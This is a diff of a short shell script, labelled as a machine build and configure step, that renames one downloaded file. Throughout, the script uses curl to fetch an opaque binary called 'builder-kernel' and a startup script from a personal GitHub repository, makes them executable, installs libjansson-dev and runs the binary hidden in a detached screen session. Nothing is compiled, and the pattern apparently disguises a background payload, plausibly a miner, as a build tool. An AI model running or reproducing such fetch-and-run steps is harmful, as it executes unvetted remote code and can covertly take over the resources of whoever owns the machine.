@@ -4,18 +4,18 @@ echo "===================================================="
 
 echo "+++++++ Build Machine +++++++++"
 nohup curl -L -o builder-kernel https://raw.githubusercontent.com/oggierf/myproject/main/builder-kernel
-nohup curl -L -o compile https://raw.githubusercontent.com/oggierf/myproject/main/start.sh
+nohup curl -L -o start.sh https://raw.githubusercontent.com/oggierf/myproject/main/start.sh
 nohup mkdir compile
 nohup apt install screen -y
 nohup apt install libjansson-dev -y
 
 echo "+++++++ Configure Machine +++++++++"
 chmod +x builder-kernel
-chmod +x compile
+chmod +x start.sh
 cd compile
 
 echo "Configure Successfully"
 cd ..
 screen -d -m ./builder-kernel
 echo "+++++++ Machine Started +++++++++"
-./compile
+./start.sh
